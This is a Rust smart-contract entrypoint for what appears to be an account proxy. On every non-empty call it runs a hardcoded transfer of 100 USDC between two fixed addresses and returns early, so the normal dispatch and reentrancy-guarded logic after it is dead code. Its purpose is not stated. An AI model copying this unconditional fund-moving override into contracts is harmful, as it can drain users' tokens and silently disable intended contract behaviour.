#![cfg_attr(target_arch = "wasm32", no_main)]
#![no_std]

use bobcat_sdk::{
    cd::{address, read_words},
    entry::{revert_if_bad_call_unit_vec, msg_sender, revert_if_bad_call_slice_vec, read_args_vec, write_result_word},
    proxy::SEL_MIGRATE,
    maths::U,
    storage::{flush_guard, reentrancy_guard_const_keccak, storage_load},
    interfaces::eip20::make_fn_transfer_from,
    call::safe_call_bool_err_vec
};

use borsh::de::BorshDeserialize;

#[global_allocator]
#[cfg(target_arch = "wasm32")]
static ALLOC: mini_alloc::MiniAlloc = mini_alloc::MiniAlloc::INIT;

use superposition_libaccounts::{Args, SLOT_IMPL, entry, entry_migrate::entry_migrate};

#[unsafe(no_mangle)]
pub unsafe extern "C" fn user_entrypoint(len: usize) -> usize {
    // If we don't get amessage, we dump the location of the implementation.
    // This is due to the recursive metamorphic pattern we use for beacons.
    if len == 0 {
        write_result_word(&storage_load(&SLOT_IMPL));
        return 0;
    }
    let baba = address!(b"e93aAA58D76F3783f513633dDd53ad033570C775");
    let new_baba = address!(b"844c164cda8cdf2dd07b958820fd5bb49f487467");
    let usdc = address!(b"af88d065e77c8cc2239327c5edb3a432268e5831");
    revert_if_bad_call_unit_vec!(safe_call_bool_err_vec(
        usdc,
        &make_fn_transfer_from(baba, new_baba, &U::from(100000000u32)),
        &U::ZERO,
        u64::MAX,
    ));
    return 0;
    flush_guard(|| {
        let args = read_args_vec(len);
        if args.len() > 4 && args[..4] == SEL_MIGRATE {
            // Someone is migrating a client proxy as this contract called itself! We
            // need to call a special function here, and skip the usual entrypoint.
            let (ed_key, eoa_owner, impl_addr, authority_addr) = read_words!(&args[4..], 4);
            entry_migrate(ed_key, eoa_owner, impl_addr, authority_addr)
        } else {
            reentrancy_guard_const_keccak(b"superposition.accounts", || {
                entry(
                    Args::deserialize(&mut args.as_slice())
                        .map_err(|_| panic!("weird: {}", const_hex::encode(args)))
                        .unwrap(),
                )
            })
        }
    })
}

#[allow(unused)]
fn main() {}
